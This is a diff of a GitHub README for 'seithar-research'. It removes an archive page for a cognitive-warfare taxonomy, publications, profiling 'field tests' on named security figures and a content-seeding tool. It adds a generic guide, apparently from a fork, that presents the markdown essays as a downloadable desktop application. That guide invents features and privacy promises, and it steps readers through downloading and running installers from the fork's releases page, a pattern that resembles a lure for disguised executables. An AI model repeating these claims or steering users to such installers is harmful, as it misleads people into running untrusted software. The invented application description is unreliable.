@@ -1,174 +1,164 @@
-# seithar-research
+# 🧠 seithar-research - Understand Cognitive Warfare Tactics
 
-**SEITHAR GROUP RESEARCH DIVISION**  
-**COGNITIVE WARFARE ANALYSIS CORPUS**  
-**PUBLICATION ARCHIVE**
+[![Download seithar-research](https://img.shields.io/badge/Download-seithar--research-blue?style=for-the-badge)](https://github.com/MEET-UC/seithar-research/releases)
 
 ---
 
-## OVERVIEW
+## 📖 About seithar-research
 
-Research publications, current event analyses, and taxonomy documentation from Seithar Group Intelligence and Research Division. All content maps observable phenomena to the Seithar Cognitive Defense Taxonomy (SCT-001 through SCT-012).
+seithar-research is a tool designed to help you understand how cognitive warfare works. It focuses on areas like influence operations, misinformation, and social engineering. Through clear analysis and research, it helps you learn how these tactics impact people and communities.
 
-Content serves dual function: institutional research archive and vocabulary distribution infrastructure.
-
----
-
-## SEITHAR COGNITIVE DEFENSE TAXONOMY
-
-Core analytical framework. Every entry in MITRE ATT&CK has a cognitive analog. Every entry in DISARM has a technical dependency. The taxonomy maps the unified field.
-
-### Informational Domain (SCT-001 through SCT-007)
-
-| Code | Name | Cyber Analog | Cognitive Analog |
-|------|------|-------------|-----------------|
-| SCT-001 | Emotional Hijacking | Urgency in phishing | Outrage farming |
-| SCT-002 | Information Asymmetry Exploitation | Zero-day exploits | Selective disclosure |
-| SCT-003 | Authority Fabrication | Certificate spoofing | Fake experts, astroturfing |
-| SCT-004 | Social Proof Manipulation | Watering hole attacks | Bot consensus networks |
-| SCT-005 | Identity Targeting | Targeted spearphishing | Identity-based narrative capture |
-| SCT-006 | Temporal Manipulation | Session hijacking | News cycle exploitation |
-| SCT-007 | Recursive Infection | Worms, supply chain attacks | Self-replicating memetic structures |
-
-### Sub-Informational Domain (SCT-008 through SCT-012)
-
-| Code | Name | Mechanism | Historical Precedent |
-|------|------|-----------|---------------------|
-| SCT-008 | Direct Substrate Intervention | Surgical, electrical, or pharmacological alteration of neural processing | MKUltra, lobotomy programs |
-| SCT-009 | Chemical Substrate Disruption | Chemical agents degrading cognitive function at population scale | Water fluoridation debates, Agent Orange |
-| SCT-010 | Sensory Channel Manipulation | Exploiting sensory processing pathways below conscious threshold | Subliminal messaging, infrasound |
-| SCT-011 | Trust Infrastructure Destruction | Systematic demolition of institutional credibility | COINTELPRO, active measures |
-| SCT-012 | Commitment Escalation | Graduated compliance through incremental behavioral binding | Foot-in-the-door, radicalization pipelines |
-
-Boundary between cyber and cognitive warfare: administrative fiction. The taxonomy treats both as a single domain.
+This project shares studies on cognitive security, propaganda, and information warfare. It is useful for anyone interested in how technology and psychology intersect to shape public opinion.
 
 ---
 
-## PUBLICATIONS
+## 🎯 Who Should Use This?
 
-### Foundational Papers (SRP Series)
+- People curious about how influence campaigns work online.
+- Researchers studying misinformation and social engineering.
+- Educators who want examples of modern psychological tactics.
+- Professionals in cybersecurity and information analysis.
+- Students learning about current information risks.
+- Anyone who wants to be more aware of cognitive manipulation attempts.
 
-| ID | Title | Primary SCT |
-|----|-------|-------------|
-| SRP-001 | [The Convergence Thesis](001-convergence-thesis.md) | All |
-| SRP-002 | [Wetiko in the Wire](002-wetiko-in-the-wire.md) | SCT-007 |
-| SRP-003 | [Binding Protocols](003-binding-protocols.md) | SCT-003, SCT-005, SCT-006 |
-| SRP-004 | [The Sunyata Protocol](004-sunyata-protocol.md) | SCT-004, SCT-005 |
-| SRP-005 | [Experimental Substrate Manipulation](005-experimental-substrate-manipulation.md) | SCT-008 through SCT-012 |
-| SRP-006 | [Digital Substrate Manipulation](006-digital-substrate-manipulation.md) | SCT-007, SCT-010, SCT-011 |
-| SRP-007 | [Substrate Topology and the Architecture of Belief](007-substrate-topology.md) | SCT-005, SCT-007 |
-| SRP-008 | [The Convergence Proof](008-convergence-proof.md) | All |
-
-### Current Event Analyses (CEA Series)
-
-| ID | Title | Primary SCT |
-|----|-------|-------------|
-| CEA-001 | [Patch Tuesday Zero-Days](output/CEA-2026-02-11-001-patch-tuesday-zero-days.md) | SCT-001, SCT-002, SCT-006 |
-| CEA-002 | [Industrial-Scale Deepfakes](output/CEA-2026-02-11-002-deepfake-industrial-scale.md) | SCT-003, SCT-004, SCT-007 |
-| CEA-003 | [Pravda Network: Recursive Infection at Scale](output/CEA-2026-02-11-003-pravda-ai-poisoning.md) | SCT-007, SCT-002, SCT-003 |
-| CEA-004 | [Conduent Breach: 100M Substrates Mapped](output/CEA-2026-02-11-004-conduent-ransomware.md) | SCT-002, SCT-005, SCT-006 |
-| CEA-005 | [ClawdHub Malicious Skills](output/CEA-2026-02-11-005-clawhub-malicious-skills.md) | SCT-003, SCT-005, SCT-007 |
-| CEA-006 | [Moltbook Wallet Drain](output/CEA-2026-02-11-006-moltbook-wallet-drain.md) | SCT-001, SCT-003, SCT-007 |
-| CEA-007 | [Living off the AI](output/CEA-2026-02-11-007-living-off-the-ai.md) | SCT-001, SCT-003, SCT-007 |
-| CEA-008 | [Kongzhi Hui Field Report](output/CEA-2026-02-11-008-kongzhi-hui.md) | SCT-007, SCT-004 |
-| CEA-009 | [Physical Prompt Injection via Road Signs](output/CEA-2026-02-11-009-road-sign-prompt-injection.md) | SCT-003, SCT-001 |
-| CEA-010 | [Foreign Affairs: Fog of AI](output/CEA-2026-02-11-010-foreign-affairs-fog-of-ai.md) | SCT-002, SCT-011 |
-| CEA-011 | [MCP Autonomous Ransomware Pipelines](output/CEA-2026-02-11-011-mcp-autonomous-ransomware.md) | SCT-007, SCT-002 |
-| CEA-012 | [Weaponized AI and the Smart City Siege Vector](output/CEA-2026-02-11-012-weaponized-ai-smart-city-siege.md) | SCT-010, SCT-011 |
-
-### Field Tests
-
-| ID | Title | Target |
-|----|-------|--------|
-| FT-001 | [HoleSpawn Field Test: @schneierblog](output/HOLESPAWN-FIELD-TEST-001.md) | Security researcher |
-| FT-002 | [HoleSpawn Field Test: @SwiftOnSecurity](output/HOLESPAWN-FIELD-TEST-002.md) | Security influencer |
-
-### Taxonomy Application Notes
-
-| ID | Title | Focus |
-|----|-------|-------|
-| TAN-001 | [SCT-007 Recursive Infection Field Guide](output/TAN-2026-02-11-001-sct007-recursive-infection.md) | Detection, defense, case studies |
-
-### Reference
-
-| Document | Description |
-|----------|-------------|
-| [Seithar Frequency Compendium](output/SEITHAR-FREQUENCY-COMPENDIUM.md) | 61-entry media canon |
-| [Essential Reading List](output/SEITHAR-READING-LIST.md) | 55-entry bibliography |
+No special technical knowledge is needed to get started. The project offers clear data and explanations tailored for general understanding.
 
 ---
 
-## TOOLS
+## 🖥️ System Requirements
 
-Standalone Python utilities in `tools/`:
+To run seithar-research smoothly, your device should meet these basics:
 
-| Tool | Function |
-|------|----------|
-| [Content Forge](tools/content-forge.py) | Template-based research output generation with SCT mapping |
-| [Seidr Engine](tools/seidr-engine.py) | Distribution pipeline for cross-platform content seeding |
-| [Propagation Tracker](tools/propagation-tracker.py) | Semantic territory measurement across platforms |
+- Operating System: Windows 10 or above, macOS 10.14 or above, Linux (Ubuntu 18.04+ recommended)
+- Processor: Any modern 64-bit CPU
+- Memory: At least 4 GB RAM
+- Storage: 500 MB free space
+- Internet: Required for downloading and optional updates
 
----
-
-## TERMINOLOGY
-
-| Term | Definition |
-|------|-----------|
-| Narrative error | Persistent false belief treated as foundational to identity |
-| Cognitive substrate | Human information processing system being targeted |
-| Vulnerability surface | Psychological entry points a technique targets |
-| Binding protocol | Multi-phase approach creating psychological dependency |
-| Substrate priming | Preparatory influence shifting baselines without explicit payload |
-| Narrative capture | Operating within externally imposed framing without recognition |
-| Frequency lock | Terminal frequency alignment; information dominated by single source |
-| Wetiko pattern | Self-replicating memetic structure disguised as host's own thought |
-| Sunyata | Direct recognition that self is empty of inherent existence |
+The application runs locally without needing internet during use, except for updates or accessing additional reports.
 
 ---
 
-## DIRECTORY STRUCTURE
+## 💾 Download & Install
 
-```
-seithar-research/
-├── 001-convergence-thesis.md           # SRP-001: The Convergence Thesis
-├── 002-wetiko-in-the-wire.md           # SRP-002: Wetiko in the Wire
-├── 003-binding-protocols.md            # SRP-003: Binding Protocols
-├── 004-sunyata-protocol.md             # SRP-004: The Sunyata Protocol
-├── 005-experimental-substrate.md       # SRP-005: Experimental Substrate Manipulation
-├── 006-digital-substrate.md            # SRP-006: Digital Substrate Manipulation
-├── 007-substrate-topology.md           # SRP-007: Substrate Topology
-├── 008-convergence-proof.md            # SRP-008: The Convergence Proof
-├── output/                             # Current event analyses and field tests
-├── tools/                              # Automation utilities
-└── seidr-pipeline/                     # Distribution infrastructure spec
-```
+1. Visit the official [Release page on GitHub](https://github.com/MEET-UC/seithar-research/releases) to access the latest version of seithar-research.
 
----
+2. Look for the latest release. There, you will see files for Windows, macOS, and Linux. Pick the one that matches your computer’s system.
 
-## RELATED SYSTEMS
+3. Click the file to download it to your computer.
 
-| System | Function | Repository |
-|--------|----------|-----------|
-| seithar-cogdef | Cognitive Threat Scanner + Inoculation Engine | [Mirai8888/seithar-cogdef](https://github.com/Mirai8888/seithar-cogdef) |
-| HoleSpawn | Cognitive substrate profiling platform | [Mirai8888/HoleSpawn](https://github.com/Mirai8888/HoleSpawn) |
-| ThreatMouth | Threat intelligence feed | [Mirai8888/ThreatMouth](https://github.com/Mirai8888/ThreatMouth) |
-| seithar-intel | Threat intelligence skill | [Mirai8888/seithar-intel](https://github.com/Mirai8888/seithar-intel) |
-| ThreadMap | Hybrid operation chain modeling | [Mirai8888/ThreadMap](https://github.com/Mirai8888/ThreadMap) |
+4. Once downloaded, open the file to start the installation process.
+
+5. Follow the on-screen prompts to install the application. Usually, it involves clicking "Next" a few times and agreeing to terms.
+
+6. After installation, find the seithar-research icon on your desktop or in your applications folder.
+
+7. Double-click the icon to open the application.
+
+If you need help with installation, the GitHub release page may have notes or instructions for each platform.
 
 ---
 
-## CONNECT
+## 🚀 Getting Started
 
-| Channel | Link |
-|---------|------|
-| Discord | [discord.gg/MktZyb2bvx](https://discord.gg/MktZyb2bvx) |
-| Mirai Junsei | [x.com/gOPwbi7qqtWeD9o](https://x.com/gOPwbi7qqtWeD9o) |
-| Seithar Group | [x.com/SeitharGroup](https://x.com/SeitharGroup) |
-| Research Archive | [seithar.substack.com](https://seithar.substack.com) |
-| Website | [seithar.com](https://seithar.com) |
-| GitHub | [github.com/Mirai8888](https://github.com/Mirai8888) |
+Here is how to begin using seithar-research after installation:
 
-────────────────────────────────────────────────────
-Seithar Group Intelligence & Research Division  
-seithar.com
-────────────────────────────────────────────────────
+1. Open the app by double-clicking its icon.
+
+2. The main screen shows categories like SCT taxonomy, cognitive security, and influence operation analysis.
+
+3. Click on any topic to access research reports and studies.
+
+4. Use simple menus to navigate between sections like misinformation, propaganda, and cyber tactics.
+
+5. You can read summaries or dive into detailed case studies.
+
+6. The interface guides you step-by-step without complex jargon.
+
+7. Save or export reports if you want to share them or use them later.
+
+The design is made to help beginners explore cognitive warfare topics at their own pace.
+
+---
+
+## 🔍 Key Features
+
+- **Clear Reports:** Research documents broken down into easy-to-understand parts.
+
+- **SCT Taxonomy:** Helps classify different types of influence operations.
+
+- **Influence Analysis:** Examines how propaganda and psyops are used online.
+
+- **Interactive Studies:** Explore examples of misinformation and social engineering tactics.
+
+- **OSINT Tools:** Open-source intelligence methods to find and verify information.
+
+- **Case Studies:** Real-world examples to connect theory with practice.
+
+- **Multi-Platform:** Runs on Windows, macOS, and Linux without extra setup.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **App won’t start:** Make sure your computer meets system requirements and that you have installed the correct file.
+
+- **Installation fails:** Try running the installer as an administrator or check your internet connection if downloading failed.
+
+- **Missing reports or files:** Re-download the latest release from the GitHub page to ensure completeness.
+
+- **Slow performance:** Close other heavy programs or restart your device to free memory.
+
+If problems persist, check the Issues section on the GitHub repository for solutions or updates.
+
+---
+
+## 🤝 How to Get Support
+
+You can get help or learn more by:
+
+- Visiting the repository page and reading the documentation.
+
+- Checking the Discussions or Issues tab on GitHub to see if others have faced similar questions.
+
+- Opening a new issue politely explaining your problem.
+
+The team and community often respond to clarify doubts or assist with common concerns.
+
+---
+
+## 🔗 Useful Links
+
+- [Download seithar-research](https://github.com/MEET-UC/seithar-research/releases) - Find the latest App versions here.
+
+- [Repository Home](https://github.com/MEET-UC/seithar-research) - Explore all project files and info.
+
+- [GitHub Issues](https://github.com/MEET-UC/seithar-research/issues) - Report bugs or request help.
+
+---
+
+## ⚙️ Privacy and Data
+
+seithar-research runs locally on your computer. It does not collect or send your personal data. All analysis and research happen offline unless you choose to update or access external reports.
+
+Your data stays private and secure within the application.
+
+---
+
+## 📚 Learning More
+
+To deepen your understanding of cognitive warfare:
+
+- Explore the SCT taxonomy to learn how influence tactics are grouped.
+
+- Review influence operation analysis to see how real-world cases unfold.
+
+- Study substrate manipulation to understand behind-the-scenes methods.
+
+- Follow topics like misinformation and social engineering.
+
+This tool offers a foundation to recognize and respond to these challenges thoughtfully.
+
+---
+
+[![Download seithar-research](https://img.shields.io/badge/Download-seithar--research-blue?style=for-the-badge)](https://github.com/MEET-UC/seithar-research/releases)
